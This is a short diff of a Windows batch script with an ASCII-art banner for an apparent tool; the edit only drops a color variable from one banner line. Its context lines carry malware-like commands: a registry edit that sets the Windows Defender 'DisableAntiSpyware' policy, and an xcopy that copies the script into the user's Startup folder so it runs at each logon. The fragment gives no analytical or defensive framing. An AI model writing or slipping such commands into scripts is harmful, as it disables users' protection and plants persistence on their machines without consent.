@@ -3,7 +3,7 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywa
 xcopy %0 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup >nul
 :gui
 echo.
-echo %c%          __      __             _         _____ _____   _______          _ 
+echo            __      __             _         _____ _____   _______          _ 
 echo           \ \    / /             (_)       / ____/ ____^| ^|__   __^|        ^| ^|
 echo            \ \  / /__  __ _  __ _ _  ___  ^| (___^| (___      ^| ^| ___   ___ ^| ^|
 echo             \ \/ / _ \/ _` ^|/ _` ^| ^|/ _ \  \___ \\___ \     ^| ^|/ _ \ / _ \^| ^| %u%
